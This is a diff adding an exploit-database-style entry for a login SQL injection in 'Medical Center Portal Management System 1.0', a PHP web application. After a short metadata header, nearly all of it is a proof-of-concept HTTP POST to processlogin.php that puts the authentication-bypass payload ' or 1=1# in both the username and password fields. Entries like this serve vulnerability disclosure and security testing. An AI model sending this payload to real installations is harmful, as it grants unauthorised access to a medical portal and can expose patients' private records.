@@ -1,0 +1,31 @@
+# Exploit Title: Medical Center Portal Management System 1.0 - 'login' SQL Injection
+# Dork: N/A
+# Date: 2020-11-26
+# Exploit Author: Aydın Baran Ertemir
+# Vendor Homepage: https://www.sourcecodester.com/php/14594/medical-center-portal-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14594&title=Medical+Center+Portal+Management+System+using+PHP%2FMySQLi
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali Linux
+
+# POC:
+# 1)
+# http://localhost/medic/pages/login.php
+#
+POST /medic/pages/processlogin.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
+Firefox/78.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/medic/pages/login.php
+Cookie: PHPSESSID=ef7226c5aa187ed19ce1815df30e079e
+Upgrade-Insecure-Requests: 1
+
+user=1%27+or+1%3D1%23&password=1%27+or+1%3D1%23&btnlogin=
